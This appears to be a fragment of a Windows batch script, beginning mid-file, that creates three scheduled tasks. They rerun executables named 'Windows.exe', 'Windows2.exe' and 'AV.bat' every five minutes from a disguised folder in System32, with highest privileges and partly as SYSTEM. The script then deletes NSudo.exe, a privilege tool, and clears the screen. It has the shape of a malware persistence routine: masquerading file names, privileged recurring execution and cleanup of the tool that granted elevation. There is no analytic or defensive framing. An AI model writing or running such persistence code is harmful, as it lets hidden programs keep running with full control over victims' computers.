...
cls
SCHTASKS /CREATE /F /SC MINUTE /MO 5 /TR "%systemroot%\System32\Windowsexe\Windows.exe" /TN "Windows.exe" /RL HIGHEST /RU SYSTEM
SCHTASKS /CREATE /F /SC MINUTE /MO 5 /TR "%systemroot%\System32\Windowsexe\Windows2.exe" /TN "Windows2.exe" /RL HIGHEST
SCHTASKS /CREATE /F /SC MINUTE /MO 5 /TR "%systemroot%\System32\Windowsexe\AV.bat" /TN "AV.bat" /RL HIGHEST /RU SYSTEM
cls
del /f NSudo.exe
cls
